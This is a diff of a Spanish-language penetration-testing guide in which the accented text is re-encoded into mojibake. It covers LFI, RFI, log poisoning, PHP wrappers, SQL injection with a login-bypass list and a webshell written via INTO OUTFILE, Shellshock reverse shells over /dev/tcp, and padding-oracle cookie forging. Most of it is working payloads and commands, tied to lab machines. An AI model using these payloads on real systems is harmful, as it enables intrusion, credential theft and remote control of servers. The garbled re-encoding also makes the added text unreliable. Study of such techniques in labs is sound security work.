-Otra consideración a tener en cuenta, es que de esta forma podemos leer archivos de texto, pero puede que de intentar visualizar archivos de extensión **.php** estos sean interpretados en vez de listados. Podemos evadir dicho problema haciendo lo siguiente:
+Otra consideraciÃ³n a tener en cuenta, es que de esta forma podemos leer archivos de texto, pero puede que de intentar visualizar archivos de extensiÃ³n **.php** estos sean interpretados en vez de listados. Podemos evadir dicho problema haciendo lo siguiente:
 
 `http://localhost/file.php?file=php://filter/convert.base64-encode/resource=prueba.php`
 
@@ -2099,7 +2098,7 @@ known_hosts
 /proc/self/environ
 ```
 
-Así como los siguientes en máquinas Windows:
+AsÃ­ como los siguientes en mÃ¡quinas Windows:
 
 ```bash
 c:\WINDOWS\system32\eula.txt
@@ -2136,11 +2135,11 @@ windows\repair\SAM
 
 #### LFI Code Examples
 
-A continuación, se detallan algunas vulnerabilidades de tipo **LFI** con el código del lado del servidor, para poder practicar en local dichas técnicas.
+A continuaciÃ³n, se detallan algunas vulnerabilidades de tipo **LFI** con el cÃ³digo del lado del servidor, para poder practicar en local dichas tÃ©cnicas.
 
 **Basic Includes**
 
-Código del servidor:
+CÃ³digo del servidor:
 
 ```php
 <?php
@@ -2152,23 +2151,23 @@ if(isset($file))
 }
 ```
 
-Petición legítima:
+PeticiÃ³n legÃ­tima:
 
 ```bash
 http://localhost/index.php?file=contact.php
 ```
 
-Petición malintencionada:
+PeticiÃ³n malintencionada:
 
 ```bash
-┌─[root@parrot]─[/var/www/html]
-└──╼ #curl --silent http://localhost/index.php?file=/etc/subgid
+â”Œâ”€[root@parrot]â”€[/var/www/html]
+â””â”€â”€â•¼ #curl --silent http://localhost/index.php?file=/etc/subgid
 s4vitar:100000:65536
 ```
 
 **Directory traversal attack**
 
-Código del servidor:
+CÃ³digo del servidor:
 
 ```php
 <?php
@@ -2179,23 +2178,23 @@ if(isset($file))
 }
 ```
 
-Petición legítima:
+PeticiÃ³n legÃ­tima:
 
 ```bash
 http://localhost/index.php?file=contact.php
 ```
 
-Petición malintencionada:
+PeticiÃ³n malintencionada:
 
 ```bash
-┌─[root@parrot]─[/var/www/html]
-└──╼ #curl --silent http://localhost/index.php?file=../../../../../etc/subgid
+â”Œâ”€[root@parrot]â”€[/var/www/html]
+â””â”€â”€â•¼ #curl --silent http://localhost/index.php?file=../../../../../etc/subgid
 s4vitar:100000:65536
 ```
 
 **Null Byte Injection**
 
-Código del servidor:
+CÃ³digo del servidor:
 
 ```php
 <?php
@@ -2206,24 +2205,24 @@ if(isset($file))
 }
 ```
 
-Petición legítima:
+PeticiÃ³n legÃ­tima:
 
 ```bash
 http://localhost/index.php?file=contact
 ```
 
-Petición malintencionada:
+PeticiÃ³n malintencionada:
 
 ```bash
 curl --silent "http://localhost/index.php?file=../../../../../../../../../etc/subgid%00"
 s4vitar:100000:65536
 ```
 
-Cabe decir que el **Null Byte Injection** fue arreglado en PHP a partir de la versión **5.3.4**.
+Cabe decir que el **Null Byte Injection** fue arreglado en PHP a partir de la versiÃ³n **5.3.4**.
 
 **Filter Evasion**
 
-Código del servidor:
+CÃ³digo del servidor:
 
 ```php
 <?php
@@ -2234,21 +2233,21 @@ if(isset($file))
 }
 ```
 
-Petición malintencionada:
+PeticiÃ³n malintencionada:
 
 ```bash
-┌─[root@parrot]─[/var/www/html]
-└──╼ #curl --silent "http://localhost/index.php?file=..%2F..%2F..%2F..%2F..%2Fetc/subgid"
+â”Œâ”€[root@parrot]â”€[/var/www/html]
+â””â”€â”€â•¼ #curl --silent "http://localhost/index.php?file=..%2F..%2F..%2F..%2F..%2Fetc/subgid"
 s4vitar:100000:65536
-┌─[root@parrot]─[/var/www/html]
-└──╼ #curl --silent "http://localhost/index.php?file=....//....//....//....//....//etc/subgid"
+â”Œâ”€[root@parrot]â”€[/var/www/html]
+â””â”€â”€â•¼ #curl --silent "http://localhost/index.php?file=....//....//....//....//....//etc/subgid"
 s4vitar:100000:65536
-┌─[root@parrot]─[/var/www/html]
+â”Œâ”€[root@parrot]â”€[/var/www/html]
 ```
 
 **Double encoding**
 
-Para continuar evitando filtro, se puede hacer uso de una doble codificación. Esto es, codificamos los datos por primera vez:
+Para continuar evitando filtro, se puede hacer uso de una doble codificaciÃ³n. Esto es, codificamos los datos por primera vez:
 
 ```bash
 %2E%2E%2Fetc%2Fpasswd
@@ -2262,56 +2261,56 @@ Y ahora codificamos el **%**:
 
 **Path Truncation**
 
-Sobre la solicitud en la que pretendemos hacer **LFI**, añadimos mil veces **./** para el recurso **../../../../etc/passwd/././././././<...>/.php**. Una vez el nombre del archivo cuenta con más de 4.096 bytes, se elimina la parte más larga. De esta forma, nuestra petición se convierte en **../../../../etc/passwd**.
+Sobre la solicitud en la que pretendemos hacer **LFI**, aÃ±adimos mil veces **./** para el recurso **../../../../etc/passwd/././././././<...>/.php**. Una vez el nombre del archivo cuenta con mÃ¡s de 4.096 bytes, se elimina la parte mÃ¡s larga. De esta forma, nuestra peticiÃ³n se convierte en **../../../../etc/passwd**.
 
 #### RFI
 
-Esta vulnerabilidad tiene cierta similitud que el LFI, sólo que la inclusión de archivos se produce de manera remota, permitiéndonos desde la URL vulnerable de un servicio web apuntar hacia servicios locales de nuestro equipo que estemos compartiendo.
+Esta vulnerabilidad tiene cierta similitud que el LFI, sÃ³lo que la inclusiÃ³n de archivos se produce de manera remota, permitiÃ©ndonos desde la URL vulnerable de un servicio web apuntar hacia servicios locales de nuestro equipo que estemos compartiendo.
 
-Un buen ejemplo para practicar es la máquina **TartarSauce** de HackTheBox, donde el servicio web contaba con un plugin Gwolle vulnerable a RFI. Desde el servicio web, realizábamos la siguiente consulta desde la URL:
+Un buen ejemplo para practicar es la mÃ¡quina **TartarSauce** de HackTheBox, donde el servicio web contaba con un plugin Gwolle vulnerable a RFI. Desde el servicio web, realizÃ¡bamos la siguiente consulta desde la URL:
 
 `http://192.168.1.X/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abs
 path=http://nuestraIP/wp-load.php`
 
-De esta forma, resulta sencillo pensar en lo fácil que puede llegar a ser para el caso descrito el acceso al sistema.
+De esta forma, resulta sencillo pensar en lo fÃ¡cil que puede llegar a ser para el caso descrito el acceso al sistema.
 
 #### LFI to RCE
 
-Existen varias formas de conseguir ejecutar comandos en remoto a través de un **Local File Inclusion**, así como de acceder al sistema a través de la visualización de ciertos recursos. Para este caso, explicaré 2 técnicas a modo de ejemplo:
+Existen varias formas de conseguir ejecutar comandos en remoto a travÃ©s de un **Local File Inclusion**, asÃ­ como de acceder al sistema a travÃ©s de la visualizaciÃ³n de ciertos recursos. Para este caso, explicarÃ© 2 tÃ©cnicas a modo de ejemplo:
 
 * Log Poisoning (access.log & auth.log)
 * Mail PHP Execution
 
 La primera de ellas [**Log Poisoning**], consiste en verificar si las rutas _/var/log/auth.log_ y _/var/log/apache2/access.log_ son visibles desde el **LFI**.
 
-En caso de serlo para la ruta _/var/log/auth.log_, podemos llevar a cabo técnicas de autenticación que nos permitan obtener ejecución de comandos en remoto. Esta ruta almacena las autenticaciones establecidas sobre el sistema, entre ellas además de las normales de sesión, las que van por SSH.
+En caso de serlo para la ruta _/var/log/auth.log_, podemos llevar a cabo tÃ©cnicas de autenticaciÃ³n que nos permitan obtener ejecuciÃ³n de comandos en remoto. Esta ruta almacena las autenticaciones establecidas sobre el sistema, entre ellas ademÃ¡s de las normales de sesiÃ³n, las que van por SSH.
 
-Esto en otras palabras se traduce en que por cada intento fallido de conexión por SSH hacia el sistema, se generará un reporte visible en el recurso _/var/log/auth.log_. La idea en este punto es aprovechar la visualización del recurso para forzar la autenticación de un usuario no convencional, donde incrustramos un código PHP que nos permite posteriormente desde el LFI ejecutar comandos sobre el sistema.
+Esto en otras palabras se traduce en que por cada intento fallido de conexiÃ³n por SSH hacia el sistema, se generarÃ¡ un reporte visible en el recurso _/var/log/auth.log_. La idea en este punto es aprovechar la visualizaciÃ³n del recurso para forzar la autenticaciÃ³n de un usuario no convencional, donde incrustramos un cÃ³digo PHP que nos permite posteriormente desde el LFI ejecutar comandos sobre el sistema.
 
 Ejemplo:
 
 `ssh "<?php system('whoami'); ?>"@192.168.1.X`
 
-Tras introducir una contraseña incorrecta para el usuario inexistente, se generará un reporte en el recurso _auth.log_ como el siguiente:
+Tras introducir una contraseÃ±a incorrecta para el usuario inexistente, se generarÃ¡ un reporte en el recurso _auth.log_ como el siguiente:
 
 ```bash
 Nov  5 11:53:46 parrot sshd[13626]: Failed password for invalid user <?php echo system('whoami'); ?> from ::1 port 39988 ssh2
 Nov  5 11:53:48 parrot sshd[13626]: Connection closed by invalid user <?php echo system('whoami'); ?> ::1 port 39988 [preauth]
 ```
 
-Llegados a este punto, si desde la URL aprovechando el LFI apuntamos a dicho recurso, veremos cómo figurará un usuario '***www-data***' para el campo _whoami_ definido en el script php incrustrado a través del usuario de autenticación.
+Llegados a este punto, si desde la URL aprovechando el LFI apuntamos a dicho recurso, veremos cÃ³mo figurarÃ¡ un usuario '***www-data***' para el campo _whoami_ definido en el script php incrustrado a travÃ©s del usuario de autenticaciÃ³n.
 
-Para el caso del recurso _access.log_ pasa algo similar, sólo que en cuanto a la implementación técnica se realizarn otras operaciones.
+Para el caso del recurso _access.log_ pasa algo similar, sÃ³lo que en cuanto a la implementaciÃ³n tÃ©cnica se realizarn otras operaciones.
 
-Siempre suelo emplear Burpsuite como intermediario, pero también se puede hacer desde curl modificando el **User-Agent**. Lo que necesitamos hacer es realizar una consulta a la página web cambiando el User-Agent por un código PHP. De esta forma, tras visualizar el recurso _access.log_ de Apache, veremos como el código PHP es interpretado en el User-Agent de la petición en la respuesta del lado del servidor, pudiendo posteriormente ejecutar comandos en remoto de la misma forma que sucedía con el recurso _auth.log_.
+Siempre suelo emplear Burpsuite como intermediario, pero tambiÃ©n se puede hacer desde curl modificando el **User-Agent**. Lo que necesitamos hacer es realizar una consulta a la pÃ¡gina web cambiando el User-Agent por un cÃ³digo PHP. De esta forma, tras visualizar el recurso _access.log_ de Apache, veremos como el cÃ³digo PHP es interpretado en el User-Agent de la peticiÃ³n en la respuesta del lado del servidor, pudiendo posteriormente ejecutar comandos en remoto de la misma forma que sucedÃ­a con el recurso _auth.log_.
 
-Otra de las técnicas para conseguir la ejecución de comandos a través de un **LFI** es por medio de archivos **proc**. Podemos encontrar la metodología paso a paso en el [siguiente recurso](https://www.exploit-db.com/papers/12992/).
+Otra de las tÃ©cnicas para conseguir la ejecuciÃ³n de comandos a travÃ©s de un **LFI** es por medio de archivos **proc**. Podemos encontrar la metodologÃ­a paso a paso en el [siguiente recurso](https://www.exploit-db.com/papers/12992/).
 
 La segunda de ellas [**Mail PHP Execution**], consiste en aprovechar la vulnerabilidad LFI para tras visualizar los usuarios en el recurso '**/etc/passwd**', poder visualizar sus correspondientes mails en '**/var/mail/usuario**'.
 
-Es decir, suponiendo que tenemos nociones de que existe un usuario '**www-data**' sobre el sistema, en caso de contar con el servicio **smtp** corriendo, podemos "malformar" un mensaje para insertar código PHP y posteriormente apuntarlo desde el navegador.
+Es decir, suponiendo que tenemos nociones de que existe un usuario '**www-data**' sobre el sistema, en caso de contar con el servicio **smtp** corriendo, podemos "malformar" un mensaje para insertar cÃ³digo PHP y posteriormente apuntarlo desde el navegador.
 
-En caso de no llegar a saber qué usuarios hay en el sistema, podemos hacer uso de la herramienta **smtp-user-enum** para enumerar usuarios sobre el servicio:
+En caso de no llegar a saber quÃ© usuarios hay en el sistema, podemos hacer uso de la herramienta **smtp-user-enum** para enumerar usuarios sobre el servicio:
 
 ```bash
 smtp-user-enum -M VRFY -U top_shortlist.txt -t 192.168.1.X 
@@ -2344,13 +2343,13 @@ echo shell_exec($_REQUEST['cmd']);
 ?>
 ```
 
-¿Qué tendremos que hacer llegados a este punto?, teniendo en cuenta que el mail ha sido enviado, tan sólo tendremos que hacer lo siguiente:
+Â¿QuÃ© tendremos que hacer llegados a este punto?, teniendo en cuenta que el mail ha sido enviado, tan sÃ³lo tendremos que hacer lo siguiente:
 
 ```bash
 http://192.168.1.X/?page=../../../../../var/mail/www-data?cmd=comando-a-ejecutar
 ```
 
-Y el navegador nos devolverá el output del comando aplicado a nivel de sistema.
+Y el navegador nos devolverÃ¡ el output del comando aplicado a nivel de sistema.
 
 #### LFI to RCE via PHP Sessions
 
@@ -2374,7 +2373,7 @@ La idea es setear la Cookie a `<?php system('cat /etc/passwd');?>`:
 login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
 ```
 
-Una vez hecho, podemos incluir el archivo PHP de la siguiente forma a través del LFI:
+Una vez hecho, podemos incluir el archivo PHP de la siguiente forma a travÃ©s del LFI:
 
 ```bash
 login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
@@ -2382,7 +2381,7 @@ login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/s
 
 #### LFI to RCE via Environ
 
-Si por algún casual podemos visualizar el recurso **/proc/self/environ**, como si se tratara de un recurso log, enviaremos nuestro Payload en el User-Agent:
+Si por algÃºn casual podemos visualizar el recurso **/proc/self/environ**, como si se tratara de un recurso log, enviaremos nuestro Payload en el User-Agent:
 
 ```bash
 GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
@@ -2399,13 +2398,13 @@ http://example.com/index.php?page=php://filter/convert.base64-encode/resource=in
 http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
 ```
 
-Se puede jugar con otro wrapper de compresión en caso de contar con un archivo muy grande:
+Se puede jugar con otro wrapper de compresiÃ³n en caso de contar con un archivo muy grande:
 
 ```bash
 http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 ```
 
-Así mismo, los wrappers también pueden ser encadenados:
+AsÃ­ mismo, los wrappers tambiÃ©n pueden ser encadenados:
 
 ```bash
 php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s
@@ -2424,7 +2423,7 @@ http://example.com/index.php?page=zip://shell.jpg%23payload.php
 
 ##### Wrapper data://
 
-Este Wrapper nos permite ejecutar directamente código PHP:
+Este Wrapper nos permite ejecutar directamente cÃ³digo PHP:
 
 ```bash
 http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
@@ -2437,15 +2436,15 @@ Otra forma:
 http://example.com/index.php?file=data:text/plain;,<?php echo shell_exec($_GET['cmd']);?>
 ```
 
-Otro payload interesante a tener en cuenta es el `<?php phpinfo(); die();?>`. La funcionalidad **die** previene la ejecución del resto del script o la ejecución de la extensión decodificada incorrectamente anexada a la secuencia.
+Otro payload interesante a tener en cuenta es el `<?php phpinfo(); die();?>`. La funcionalidad **die** previene la ejecuciÃ³n del resto del script o la ejecuciÃ³n de la extensiÃ³n decodificada incorrectamente anexada a la secuencia.
 
-Para ejecutar en ambos casos directamente un comando, la solicitud de datos + carga útil puede ser:
+Para ejecutar en ambos casos directamente un comando, la solicitud de datos + carga Ãºtil puede ser:
 
 ```bash
 http://example.com/index.php?file=data:,<?system($_GET['x']);?>&x=ls
 ```
 
-O también:
+O tambiÃ©n:
 
 ```bash
 http://example.com/index.php?file=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls.
@@ -2460,14 +2459,14 @@ http://example.com/index.php?page=expect://ls
 
 ##### Wrapper input://
 
-Especificamos nuestro payload a través de un parámetro POST:
+Especificamos nuestro payload a travÃ©s de un parÃ¡metro POST:
 
 ```bash
 http://example.com/index.php?page=php://input
 POST DATA: <? system('id'); ?>
 ```
 
-También puede hacerse desde terminal de la siguiente forma:
+TambiÃ©n puede hacerse desde terminal de la siguiente forma:
 
 ```bash
 $~ echo "<? system('id'); ?>" | POST http://example.com/index.php?page=php://input
@@ -2492,9 +2491,9 @@ $phar->setMetadata($object);
 $phar->stopBuffering();
 ```
 
-Si llegados a este punto, cualquier operación es realizada en nuestro archivo Phar existente haciendo uso del wrapper **phar://**, entonces los metadatos serializados son deserializados y por tanto interpretados.
+Si llegados a este punto, cualquier operaciÃ³n es realizada en nuestro archivo Phar existente haciendo uso del wrapper **phar://**, entonces los metadatos serializados son deserializados y por tanto interpretados.
 
-Si esta aplicación contase con una clase llamada **AnyClass** y tuviese los métodos mágicos **__destruct()** o **__wakeup()** definidos, entonces estos serían invocados automáticamente:
+Si esta aplicaciÃ³n contase con una clase llamada **AnyClass** y tuviese los mÃ©todos mÃ¡gicos **__destruct()** o **__wakeup()** definidos, entonces estos serÃ­an invocados automÃ¡ticamente:
 
 ```bash
 class AnyClass {
@@ -2508,17 +2507,17 @@ include('phar://test.phar');
 
 #### SQLI
 
-Ejemplo básico aplicado sobre servicio web falso http://www.paginaweb.com/contenidos.php?Id=3
+Ejemplo bÃ¡sico aplicado sobre servicio web falso http://www.paginaweb.com/contenidos.php?Id=3
 
-Comprobamos que la web es vulnerable a inyección SQL:
+Comprobamos que la web es vulnerable a inyecciÃ³n SQL:
 
 `http://www.paginaweb.com/contenidos.php?Id=-1 `
 
-Enumeramos hasta coincidir con el número de columnas para generar las etiquetas:
+Enumeramos hasta coincidir con el nÃºmero de columnas para generar las etiquetas:
 
 `http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,2,3,4,5-- -`
 
-Nos aprovechamos de las etiquetas generadas para ver si somos capaces de visualizar archivos sobre el sistema, así como para saber el versionado del servicio de base de datos y el usuario que corre dicho servicio:
+Nos aprovechamos de las etiquetas generadas para ver si somos capaces de visualizar archivos sobre el sistema, asÃ­ como para saber el versionado del servicio de base de datos y el usuario que corre dicho servicio:
 
 `http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,select_file('/etc/passwd'),3,4,5-- -`
 `http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,@@version,3,4,5-- -`
@@ -2528,11 +2527,11 @@ Comenzamos a enumerar las tablas de la base de datos:
 
 `http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,table_name,3,4,5+from+information_schema.tables+limit+0,1-- -`
 
-Nos montamos un script en **Bash** (o en otro lenguaje) para determinar de forma rápida qué tablas existen sobre la base de datos, parseando para ello los resultados en función del caso que se nos presente:
+Nos montamos un script en **Bash** (o en otro lenguaje) para determinar de forma rÃ¡pida quÃ© tablas existen sobre la base de datos, parseando para ello los resultados en funciÃ³n del caso que se nos presente:
 
 ```bash
 for i in $(seq 1 200); do
-    echo -n "Para el número $i: "
+    echo -n "Para el nÃºmero $i: "
     curl --silent "http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,table_name,3,4,5+from+information_schema.tables+limit+$i,1--%20-" | grep "eltitulo" | cut -d '>' -f 2 | awk '{print $1}' FS="<"
 done
 ```
@@ -2540,17 +2539,17 @@ done
 Obteniendo resultados como los siguientes:
 
 ```bash
-Para el número 63: CABECERA
-Para el número 64: COLABORADORES
-Para el número 65: CONTENIDOS
-Para el número 66: DOCUMENTOS
-Para el número 67: HORARIOS
-Para el número 68: IDIOMAS
-Para el número 69: IMAGENES
-Para el número 70: MODULOS
-Para el número 71: NOTICIAS
-Para el número 72: PERMISOS
-Para el número 73: USUARIOS
+Para el nÃºmero 63: CABECERA
+Para el nÃºmero 64: COLABORADORES
+Para el nÃºmero 65: CONTENIDOS
+Para el nÃºmero 66: DOCUMENTOS
+Para el nÃºmero 67: HORARIOS
+Para el nÃºmero 68: IDIOMAS
+Para el nÃºmero 69: IMAGENES
+Para el nÃºmero 70: MODULOS
+Para el nÃºmero 71: NOTICIAS
+Para el nÃºmero 72: PERMISOS
+Para el nÃºmero 73: USUARIOS
 ```
 
 Una vez localizada la tabla que nos interese (para este caso, la tabla **usuarios**), enumeramos las columnas existentes para dicha tabla en la base de datos:
@@ -2565,20 +2564,20 @@ Una vez sabiendo los nombres de las columnas, aprovechamos la funcionalidad _gro
 
 `http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,group_concat(usuario,0x3a,password),3,4,5+from+usuarios--%20-`
 
-Obteniendo el usuario y contraseña de acceso.
+Obteniendo el usuario y contraseÃ±a de acceso.
 
-Antes de complicarse, preferible probar inyecciones básicas sobre paneles de autenticación, esto es:
+Antes de complicarse, preferible probar inyecciones bÃ¡sicas sobre paneles de autenticaciÃ³n, esto es:
 
 ```bash
 Usuario: admin' or 1=1-- -
 Password: admin' or 1=1-- -
 ```
 
-Para casos donde podamos llevar a cabo un nuevo registro de usuario, otra vía es crear un usuario con nombre **admin' or 1=1-- -** y password **admin' or 1=1-- -**, de esta forma tras posteriormente realizar la autenticación como usuario válido, tendremos acceso a todos los datos de los usuarios en la base de datos principal.
+Para casos donde podamos llevar a cabo un nuevo registro de usuario, otra vÃ­a es crear un usuario con nombre **admin' or 1=1-- -** y password **admin' or 1=1-- -**, de esta forma tras posteriormente realizar la autenticaciÃ³n como usuario vÃ¡lido, tendremos acceso a todos los datos de los usuarios en la base de datos principal.
 
-Para técnicas de bypassing consultar el siguiente [enlace](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF)
+Para tÃ©cnicas de bypassing consultar el siguiente [enlace](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF)
 
-En caso de querer ejecutar comandos sobre el sistema, podemos aprovechar que desde consultas **sql** se pueden exportar archivos para generar el nuestro malicioso. Para ello, aplicaríamos la siguiente sintaxis a modo de ejemplo:
+En caso de querer ejecutar comandos sobre el sistema, podemos aprovechar que desde consultas **sql** se pueden exportar archivos para generar el nuestro malicioso. Para ello, aplicarÃ­amos la siguiente sintaxis a modo de ejemplo:
 
 ```bash
 http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
@@ -2588,7 +2587,7 @@ http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
 shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
 ```
 
-A continuación, un Payload de pruebas a realizar para los logins una vez hagamos la convencional **' or '1'='1**:
+A continuaciÃ³n, un Payload de pruebas a realizar para los logins una vez hagamos la convencional **' or '1'='1**:
 
 ```bash
 -'
@@ -2627,23 +2626,23 @@ or true--
 
 #### Shellshock
 
-Buenas máquinas para practicar este tipo de ataques fuera del laboratorio del OSCP son la máquina **Shocker** y la máquina **Beep** de HackTheBox.
+Buenas mÃ¡quinas para practicar este tipo de ataques fuera del laboratorio del OSCP son la mÃ¡quina **Shocker** y la mÃ¡quina **Beep** de HackTheBox.
 
-Esta es una vulnerabilidad que sólo se ve en Linux, pues en Windows no afecta. La vulnerabilidad lo que nos permite es, tras no validar de forma correcta la declaración de funciones en variables, ejecutar comandos en remoto sobre sistemas a través de consultas en este caso por medio de peticiones web.
+Esta es una vulnerabilidad que sÃ³lo se ve en Linux, pues en Windows no afecta. La vulnerabilidad lo que nos permite es, tras no validar de forma correcta la declaraciÃ³n de funciones en variables, ejecutar comandos en remoto sobre sistemas a travÃ©s de consultas en este caso por medio de peticiones web.
 
-Un buen **Low Hanging Fruit** puede consistir en enumerar el directorio **/cgi-bin/** de una página web. De existir, podemos buscar por archivos de extensión '**.cgi**', aunque no es extrictamente necesario... pues también podría tratarse de un archivo de extensión '**.sh**' y los efectos serían los mismos.
+Un buen **Low Hanging Fruit** puede consistir en enumerar el directorio **/cgi-bin/** de una pÃ¡gina web. De existir, podemos buscar por archivos de extensiÃ³n '**.cgi**', aunque no es extrictamente necesario... pues tambiÃ©n podrÃ­a tratarse de un archivo de extensiÃ³n '**.sh**' y los efectos serÃ­an los mismos.
 
-En caso de encontrar estos recursos, podemos realizar pruebas como las que se describen a continuación. En primer lugar nos ponemos en escucha por un puerto en nuestro equipo vía Netcat. En segundo lugar realizamos la siguiente petición desde terminal al servicio web:
+En caso de encontrar estos recursos, podemos realizar pruebas como las que se describen a continuaciÃ³n. En primer lugar nos ponemos en escucha por un puerto en nuestro equipo vÃ­a Netcat. En segundo lugar realizamos la siguiente peticiÃ³n desde terminal al servicio web:
 
 ```bash
 $~ curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ipLocal/puertoLocal 0>&1" "https://192.168.1.X:10000/cgi-bin/recurso.cgi" 
 ```
 
-Si todo sale bien y es vulnerable a la explotación de dicha vulnerabilidad, deberemos ganar acceso al sistema desde nuestra sesión de escucha.
+Si todo sale bien y es vulnerable a la explotaciÃ³n de dicha vulnerabilidad, deberemos ganar acceso al sistema desde nuestra sesiÃ³n de escucha.
 
-**Advertencia**: En caso de que **/bin/bash** no funcione, se recomienda probar alternativas, pues hay ocasiones en las que la ruta absoluta del binario no es la que hemos especificado, por lo que se requerirá de una ligera enumeración manual o un simple modo alternativo de conexión
+**Advertencia**: En caso de que **/bin/bash** no funcione, se recomienda probar alternativas, pues hay ocasiones en las que la ruta absoluta del binario no es la que hemos especificado, por lo que se requerirÃ¡ de una ligera enumeraciÃ³n manual o un simple modo alternativo de conexiÃ³n
 
-Otra opción es desde Burpsuite también, manipulamos el User-Agent para que figure el siguiente contenido:
+Otra opciÃ³n es desde Burpsuite tambiÃ©n, manipulamos el User-Agent para que figure el siguiente contenido:
 
 ```bash
 User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/ip/puerto 0>&1
@@ -2651,21 +2650,21 @@ User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/ip/puerto 0>&1
 
 #### Padding Oracle Attack
 
-Esta vulnerabilidad la he llegado a probar en 2 entornos. Uno de ellos es en la máquina **Padding Oracle** de _VulnHub_ y otra de ellas es la máquina **Lazy** de _HackTheBox_. Ambas máquinas se resuelven de la misma forma en cuanto a explotación de vulnerabilidad respecta, pudiendo tomar 2 vías de explotación.
+Esta vulnerabilidad la he llegado a probar en 2 entornos. Uno de ellos es en la mÃ¡quina **Padding Oracle** de _VulnHub_ y otra de ellas es la mÃ¡quina **Lazy** de _HackTheBox_. Ambas mÃ¡quinas se resuelven de la misma forma en cuanto a explotaciÃ³n de vulnerabilidad respecta, pudiendo tomar 2 vÃ­as de explotaciÃ³n.
 
-La **primera vía de explotación** consiste en a través del panel de registro, crear un nuevo usuario donde intuyendo que existe un usuario **admin** definamos un nuevo usuario **admin=**. De esta forma, creando el usuario lo que conseguiremos es crear una instancia de dicho usuario con las mismas propiedades, viendo todo su contenido a posteriori como si se tratara del usuario **admin**. 
+La **primera vÃ­a de explotaciÃ³n** consiste en a travÃ©s del panel de registro, crear un nuevo usuario donde intuyendo que existe un usuario **admin** definamos un nuevo usuario **admin=**. De esta forma, creando el usuario lo que conseguiremos es crear una instancia de dicho usuario con las mismas propiedades, viendo todo su contenido a posteriori como si se tratara del usuario **admin**. 
 
-La **segunda vía de explotación** consiste en crear en primer lugar un nuevo usuario. Una vez creado, llevamos a cabo una autenticación como dicho usuario, pillando la Cookie de sesión desde la pestaña **Network** de la propia inspección de elemento o desde **Burpsuite**.
+La **segunda vÃ­a de explotaciÃ³n** consiste en crear en primer lugar un nuevo usuario. Una vez creado, llevamos a cabo una autenticaciÃ³n como dicho usuario, pillando la Cookie de sesiÃ³n desde la pestaÃ±a **Network** de la propia inspecciÃ³n de elemento o desde **Burpsuite**.
 
-A continuación, utilizamos la herramienta **padbuster** para llevar a cabo el ataque de oráculo de relleno. Seguimos la siguiente sintaxis:
+A continuaciÃ³n, utilizamos la herramienta **padbuster** para llevar a cabo el ataque de orÃ¡culo de relleno. Seguimos la siguiente sintaxis:
 
 ```bash
 $~ padbuster http://192.168.1.x/login.php D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km 8 --cookies auth=D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km --encoding 0
 ```
 
-Donde **D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km** es la Cookie de sesión y **8** el número de bloques. A pesar de no saber la cifra con exactitud, podemos montarnos un simple bucle **for i in $(seq 1 100)** a fin de determinar el número de bloques, pues en caso de no ser correcto no se podrá aplicar la inyección.
+Donde **D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km** es la Cookie de sesiÃ³n y **8** el nÃºmero de bloques. A pesar de no saber la cifra con exactitud, podemos montarnos un simple bucle **for i in $(seq 1 100)** a fin de determinar el nÃºmero de bloques, pues en caso de no ser correcto no se podrÃ¡ aplicar la inyecciÃ³n.
 
-La herramienta tiene cierta similitud al **sqlmap** para inyecciones SQL, sólo que aquí las inyecciones las aplica sobre ciertas condiciones de error que son mostradas una vez el número de bloques proporcionado es correcto.
+La herramienta tiene cierta similitud al **sqlmap** para inyecciones SQL, sÃ³lo que aquÃ­ las inyecciones las aplica sobre ciertas condiciones de error que son mostradas una vez el nÃºmero de bloques proporcionado es correcto.
 
 Lo que obtendremos una vez todo el proceso se realice correctamente es un Output como el siguiente desde la herramienta:
 
@@ -2675,7 +2674,7 @@ Lo que obtendremos una vez todo el proceso se realice correctamente es un Output
 [+] Decrypted value (Base64): dXNlcj1zNHZpdGFyCg==
 ```
 
-Con esto entre manos, lo que podemos hacer es generar desde **Padbuster** la Cookie de sesión válida para el usuario **admin** en base a la autenticación válida del usuario cuya Cookie hemos capturado.
+Con esto entre manos, lo que podemos hacer es generar desde **Padbuster** la Cookie de sesiÃ³n vÃ¡lida para el usuario **admin** en base a la autenticaciÃ³n vÃ¡lida del usuario cuya Cookie hemos capturado.
 
 Para ello, desde **Padbuster** aplicamos la siguiente sintaxis:
 
@@ -2683,21 +2682,21 @@ Para ello, desde **Padbuster** aplicamos la siguiente sintaxis:
 $~ padbuster http://192.168.1.x/login.php D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km 8 --cookies auth=D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km --encoding 0 --plaintext user=admin
